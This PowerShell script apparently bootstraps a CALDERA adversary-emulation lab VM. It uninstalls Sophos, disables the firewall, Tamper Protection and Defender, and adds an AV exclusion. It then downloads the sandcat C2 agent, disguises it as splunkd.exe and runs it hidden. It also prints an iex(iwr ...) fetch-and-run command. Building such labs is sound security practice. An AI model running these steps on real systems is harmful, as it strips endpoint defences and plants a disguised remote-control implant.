# =============================================================================
# unmanaged-endpoint — Sandcat Agent Bootstrap
# Run as Administrator in PowerShell on the unmanaged-endpoint VM
# =============================================================================

# Step 1: Uninstall Sophos if present (this VM should be unmanaged)
$sophos = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like "Sophos*" }
if ($sophos) {
    Write-Host "[!] Sophos detected — uninstalling..." -ForegroundColor Yellow
    $sophos | ForEach-Object { $_.Uninstall() }
    Write-Host "[+] Sophos removed." -ForegroundColor Green
} else {
    Write-Host "[+] No Sophos found. Good." -ForegroundColor Green
}

# Step 2: Disable Windows Firewall
Write-Host "[*] Disabling Windows Firewall..." -ForegroundColor Cyan
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Write-Host "[+] Firewall disabled." -ForegroundColor Green

# Step 3: Disable Tamper Protection and Windows Defender
Write-Host "[*] Disabling Tamper Protection and Windows Defender..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" `
  -Name "TamperProtection" -Value 4 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Add-MpPreference -ExclusionPath "C:\Users\Public"
Write-Host "[+] Defender disabled." -ForegroundColor Green

# Step 4: Deploy CALDERA sandcat agent
Write-Host "[*] Deploying sandcat agent..." -ForegroundColor Cyan
if (-not $env:CALDERA_SERVER) {
    Write-Host "" -ForegroundColor Red
    Write-Host "[!] CALDERA_SERVER environment variable is not set." -ForegroundColor Red
    Write-Host "" -ForegroundColor Red
    Write-Host "    Set it to your Docker host IP before running this script:" -ForegroundColor Yellow
    Write-Host '    $env:CALDERA_SERVER = "192.168.1.100"' -ForegroundColor Cyan
    Write-Host "" -ForegroundColor Yellow
    Write-Host "    Then re-run:" -ForegroundColor Yellow
    Write-Host "    powershell -c `"iex(iwr 'http://<host-ip>:8081/s.ps1' -UseBasicParsing)`"" -ForegroundColor Cyan
    Write-Host "" -ForegroundColor Red
    Write-Host "    To find your Docker host IP, run on the host:" -ForegroundColor Yellow
    Write-Host "    ipconfig (Windows) or ifconfig/ip addr (macOS/Linux)" -ForegroundColor Cyan
    Write-Host "" -ForegroundColor Red
    exit 1
}
$server = "http://$($env:CALDERA_SERVER):8888"
$url    = "$server/file/download"
$dest   = "C:\Users\Public\splunkd.exe"

$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform", "windows")
$wc.Headers.add("file", "sandcat.go")
$data = $wc.DownloadData($url)

Get-Process | Where-Object { $_.modules.filename -like $dest } | Stop-Process -Force -ErrorAction Ignore
Remove-Item -Force $dest -ErrorAction Ignore
[io.file]::WriteAllBytes($dest, $data) | Out-Null

Start-Process -FilePath $dest -ArgumentList "-server $server -group red" -WindowStyle Hidden
Write-Host "[+] Sandcat deployed. Check CALDERA at $server" -ForegroundColor Green
